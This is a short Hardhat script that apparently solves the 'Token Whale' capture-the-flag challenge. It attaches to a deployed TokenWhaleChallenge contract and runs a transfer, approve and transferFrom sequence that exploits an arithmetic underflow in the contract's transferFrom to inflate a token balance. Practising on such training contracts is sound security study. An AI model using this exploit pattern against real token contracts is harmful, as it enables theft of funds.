import { task } from "hardhat/config";

const contractAddress = "0xc80aB8aE419916AE06cB07f6Edc285df1cAB54A6";

task("token-whale", "Solves the 'Predict the Token Whale' challenge", async (_taskArgs, hre) => {
  const [user1, user2] = await hre.ethers.getSigners();

  const challengeFactory = await hre.ethers.getContractFactory("TokenWhaleChallenge");
  const challengeContract = challengeFactory.attach(contractAddress);

  const transferTx = await challengeContract.connect(user1).transfer(user2.address, 501);
  await transferTx.wait();

  const approveTx = await challengeContract.connect(user2).approve(user1.address, 1000);
  await approveTx.wait();

  const transferFromTx = await challengeContract.connect(user1).transferFrom(user2.address, user2.address, 501);
  await transferFromTx.wait();
});
